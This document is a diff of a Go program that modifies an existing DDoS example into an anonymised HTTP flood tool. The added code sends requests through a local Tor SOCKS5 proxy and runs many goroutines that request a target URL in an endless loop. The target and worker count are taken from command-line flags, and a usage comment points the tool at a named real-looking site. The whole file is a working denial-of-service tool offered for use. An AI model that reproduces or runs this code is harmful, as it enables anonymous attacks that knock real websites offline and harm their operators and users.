@@ -1,10 +1,14 @@
+//This is an example of Konstantin8105/DDoS attack
+//we are adding a tor connection to it
+
 package main
 
 import (
+	"flag"
 	"fmt"
 	"io"
 	"io/ioutil"
-	"log"
+	"net/http"
 	"net/url"
 	"runtime"
 	"sync/atomic"
@@ -13,15 +17,18 @@ import (
 	"golang.org/x/net/proxy"
 )
 
+//Definig the values as struct
 type DDoS struct {
 	url           string
 	stop          *chan bool
 	amountWorkers int
 
+	// Statistic
 	successRequest int64
 	amountRequests int64
 }
 
+//initializing the workers
 func New(URL string, workers int) (*DDoS, error) {
 	if workers < 1 {
 		return nil, fmt.Errorf("Amount of workers cannot be less 1")
@@ -38,11 +45,13 @@ func New(URL string, workers int) (*DDoS, error) {
 	}, nil
 }
 
+//creating the workers
 func (d *DDoS) Run() {
-	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, nil)
-	if err != nil {
-		log.Fatal(err)
-	}
+	torcon, _ := url.Parse("socks5://127.0.0.1:9050")
+	pather, _ := proxy.FromURL(torcon, proxy.Direct)
+	nwpath := &http.Transport{Dial: pather.Dial}
+	client := &http.Client{Transport: nwpath}
+
 	for i := 0; i < d.amountWorkers; i++ {
 		go func() {
 			for {
@@ -50,14 +59,14 @@ func (d *DDoS) Run() {
 				case <-(*d.stop):
 					return
 				default:
-
-					resp, err := dialer.Dial("http", "nvnbvnbvnvb")
+					// sent http GET requests
+					resp, err := client.Get(d.url)
 					atomic.AddInt64(&d.amountRequests, 1)
 					if err == nil {
 						atomic.AddInt64(&d.successRequest, 1)
 						_, _ = io.Copy(ioutil.Discard, resp.Body)
 						_ = resp.Body.Close()
-						fmt.Println(d.successRequest)
+						fmt.Println(d)
 					}
 				}
 				runtime.Gosched()
@@ -73,15 +82,22 @@ func (d *DDoS) Stop() {
 	close(*d.stop)
 }
 
+func (d DDoS) Result() (successRequest, amountRequests int64) {
+	return d.successRequest, d.amountRequests
+}
 func main() {
-	workers := 100
-	d, err := New("hghghh", workers)
+	workers := flag.Int("workers", 100, "default set to 100")
+	urlt := flag.String("url", "", "Include the full  addr with port no")
+	flag.Parse()
+	d, err := New(*urlt, *workers)
 	if err != nil {
 		panic(err)
 	}
 	d.Run()
-	time.Sleep(time.Second)
+	time.Sleep(1 * time.Second)
 	d.Stop()
-	fmt.Println("DDoS attack server: http://127.0.0.1:80")
-
 }
+
+//usage go run ddos.go -workers=100 -url=http://somethin4chan.com:80
+
+/**************BOOOOOM***********************************/
